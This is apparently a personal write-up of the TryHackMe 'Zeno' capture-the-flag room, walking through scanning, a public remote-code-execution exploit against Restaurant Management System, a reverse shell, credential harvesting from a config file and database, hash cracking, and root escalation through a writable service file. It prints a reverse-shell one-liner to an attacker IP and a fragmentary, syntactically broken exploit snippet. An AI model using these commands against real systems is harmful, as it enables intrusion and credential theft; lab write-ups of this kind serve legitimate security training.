Let’s take a look at the [Zeno CTF](https://tryhackme.com/room/zeno) on TryHackMe Created by **@Biniru**.

## Enumeration
### Nmap Scan
The first step of my enumeration was a scan with **nmap**. by the command:

```
sudo nmap 10.10.85.109 -sS -Pn -A
```
The “Nmap Output” displayed `1` service running under port 22.
![Nmap1](/images/Zeno/nmap1.JPG)

And Also I decided to run another one on all ports:

```
sudo nmap 10.10.85.109 -sS -Pn -p- -A
```

And this time “Nmap Output” displayed `2` service running under port 22 and 12340.

### Dirsearch Scan
I next decided to run a Dirsearch scan on the webserver to see if there were any interesting hidden directories, by the command:
![dirsearch](/images/Zeno/dirsearch.JPG)

After we've completed our scan, and accessing the directory, we find a website with **Restaurant Management System** displayed.

## Exploiting
Now let’s look for exploits that we can use.

```
searchsploit Restaurant Management System
```
![Searchsploit](/images/Zeno/searchsploit.JPG)
The Output displayed that there's **RCE**: Remote Code Execution

And I modify the Exploit to:

```Python

""")

print ("Credits : All InfoSec (Raja Ji's) Group")

url = sys.argv[1]

if len(sys.argv[1]) < 8:
	print("[+] Usage : python rms-rce.py http://localhost:80/")
	exit()

print ("[+] Restaurant Management System Exploit, Uploading Shell")

target = url+"admin/foods-exec.php"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0)Gecko/20100101 Firefox/69.0",

r = requests.post(target,verify=False, headers=headers,data=data)

print("[+] Shell Uploaded. Please check the URL :"+url+"images/reverse-shell.php")
```

So it successfully did a RCE and uploaded a shell on the host :
![done](/images/Zeno/reverseShell.JPG)

And I tried **id** command:
![testID](/images/Zeno/testID.JPG)

### Reverse Shell
I set up my netcat listener on port 4444 and I fired up Burp and sent a POST request with the following encoded payload using URL encoding:

```
sh -i >& /dev/tcp/ 10.8.174.180/4444 0>&1
```
![burp](/images/Zeno/burp.JPG)

**Great!** I received a reverse connection on my port 4444.

### Database Discovery
Now we're in the machine and I decided to take a look at the `config.php` inside `connection` folder. which gave me the username and the password for accessing the database:
![configPHP](/images/Zeno/configPHP.JPG)

Then I tried to connect to the database using the credentials of last file. And I found some **Password Hashs** inside `members` table:
![tables](/images/Zeno/tables.JPG)
![members](/images/Zeno/members.JPG)

And with the help of [CrackStation](https://crackstation.net/). We found 2 out of 3 passwords:
![crackstation](/images/Zeno/crackstation.JPG)

## User Flag
Inside the home directory of the `edward` user. I notice a file called `user.txt` but I didn't have the rights to access it:
![permDENIED](/images/Zeno/permDENIED.JPG)

Then I tried to get `linpeas.sh` with the use of **curl** and **http.server**:
![serverSTART](/images/Zeno/serverSTART.JPG)
![getLIN](/images/Zeno/getLIN.JPG)

As I was reading `linpeas.sh` output I found some clear text credentials!
![linpeasOutput](/images/Zeno/linpeasOutput.JPG)
![fstab](/images/Zeno/fstab.JPG)

After I've tried to use that password for **edward**:
![ssh](/images/Zeno/ssh.JPG)

And I got the flag :

```
THM{******************}
```

## Root Flag
Now it’s time to escalate our privileges and get the root flag. The last time when we run `linpeas.sh` we found that we have write permissions on a service file:
![zenoMonitor](/images/Zeno/zenoMonitor.JPG)

And I modify the command inside the service to:
![modify](/images/Zeno/modify.JPG)

Then I reboot the system:
![reboot](/images/Zeno/reboot.JPG)

And after some minutes I entered SSH with edward credentials and I run `/bin/bash -p` and I've become root:
![root](/images/Zeno/root.JPG)
